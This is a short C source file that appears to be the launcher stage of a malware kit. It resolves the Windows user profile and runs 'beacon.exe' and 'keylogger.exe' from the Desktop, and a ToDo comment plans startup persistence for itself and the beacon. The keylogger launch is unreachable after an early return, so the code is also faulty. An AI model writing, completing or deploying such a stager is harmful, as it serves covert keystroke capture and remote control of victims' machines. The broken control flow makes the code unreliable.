#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"


int main() {
    const size_t bufferLen = 300;
    char *userProfilePath = getenv("UserProfile");
    
    /* 
        ToDo: Place self and beacon.exe in startup
    */

    char beaconPath[bufferLen];
    snprintf(beaconPath, bufferLen, "%s\\Desktop\\beacon.exe", userProfilePath);
    return run_command(beaconPath);

    char keyloggerPath[bufferLen];
    snprintf(keyloggerPath, bufferLen, "%s\\Desktop\\keylogger.exe", userProfilePath);
    return run_command(keyloggerPath);
}